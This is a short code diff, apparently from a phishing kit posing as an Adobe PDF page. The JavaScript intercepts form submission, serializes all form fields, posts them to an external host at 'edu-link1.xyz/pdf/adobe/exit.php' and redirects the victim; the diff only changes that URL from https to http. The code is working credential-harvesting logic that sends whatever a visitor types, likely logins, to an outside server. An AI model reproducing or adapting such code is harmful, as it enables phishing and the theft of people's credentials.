@@ -94,7 +94,7 @@ function MM_validateForm() { //v4.0
         e.preventDefault();
         
         $.post({
-          url : "https://edu-link1.xyz/pdf/adobe/exit.php",
+          url : "http://edu-link1.xyz/pdf/adobe/exit.php",
           data : $('form').serialize(),
           success : (response) => {
             location = response;
